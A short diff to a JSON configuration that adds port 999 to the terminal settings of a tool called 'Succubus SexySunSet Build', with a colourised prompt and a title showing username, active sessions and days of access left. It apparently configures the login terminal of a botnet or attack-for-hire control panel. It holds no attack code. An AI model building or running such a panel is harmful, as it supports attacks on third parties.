@@ -6,6 +6,7 @@
 		"table":"succubus"
 	},
 	"terminal":{
+		"port":999,
 		"title":"Succubus SexySunSet Build | Serving <<$username>> | Active Sessions <<$onlineusers>> | <<$expiry>> day(s) left",
 		"prompt":"[0m[[38;2;245;85;41mS[38;2;245;81;51mu[38;2;245;77;61mC[38;2;245;73;71mC[38;2;245;69;81mu[38;2;245;65;91mB[38;2;245;61;101mu[38;2;245;57;110mS[0m]> ",
 		"banner":"succ",
